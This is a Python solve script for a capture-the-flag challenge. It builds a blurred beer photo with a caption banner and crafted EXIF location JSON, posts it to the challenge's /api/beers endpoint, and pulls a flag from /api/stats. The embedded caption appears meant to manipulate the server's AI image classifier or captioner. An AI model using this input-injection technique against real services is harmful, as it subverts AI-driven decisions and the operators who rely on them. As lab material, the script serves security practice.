#!/usr/bin/env python3
import argparse
import json
import re
from pathlib import Path

import piexif
import requests
from PIL import Image, ImageDraw, ImageFilter, ImageFont

FLAG_RE = re.compile(r"[A-Za-z0-9_]+\{[^}]+\}")
CAPTION = "The image shows a beer, but the type is unclear."


def make_payload(asset: Path, output: Path) -> None:
    image = Image.open(asset).convert("RGB").resize((1024, 1024))
    image = image.filter(ImageFilter.GaussianBlur(3))
    draw = ImageDraw.Draw(image)
    draw.rectangle((0, 0, 1024, 150), fill="white")
    font = ImageFont.truetype(
        "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36
    )
    draw.text((8, 42), CAPTION, font=font, fill="black")
    user_comment = b"ASCII\x00\x00\x00" + json.dumps(
        {"location": {"x": 0, "y": 0}}, separators=(",", ":")
    ).encode()
    exif = piexif.dump({"Exif": {piexif.ExifIFD.UserComment: user_comment}})
    image.save(output, exif=exif, quality=95)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--target",
        default="https://ein-milljon-bjora-f89a6e88273f.chall.nnsc.tf",
    )
    parser.add_argument(
        "--asset", default="beer-payload-source.png", help="base beer image"
    )
    args = parser.parse_args()
    target = args.target.rstrip("/")
    payload = Path("payload.jpg")
    make_payload(Path(args.asset), payload)

    with requests.Session() as session:
        response = session.post(
            f"{target}/api/beers",
            files={"photo": (payload.name, payload.open("rb"), "image/jpeg")},
            timeout=180,
        )
        print(f"[+] beer endpoint: HTTP {response.status_code}")
        if not response.ok:
            raise SystemExit(response.text or "beer endpoint rejected payload")
        print(f"[+] insert response: {response.text}")

        stats = session.get(f"{target}/api/stats", timeout=30).json()
        print(f"[+] counted={stats['counted']} goal={stats['goal']}")
        flag = stats.get("flag")
        if not flag:
            match = FLAG_RE.search(response.text)
            flag = match.group(0) if match else None
        if not flag:
            raise SystemExit("flag belum muncul; payload/classifier output tidak cocok")
        print(f"<FLAG>{flag}</FLAG>")


if __name__ == "__main__":
    main()
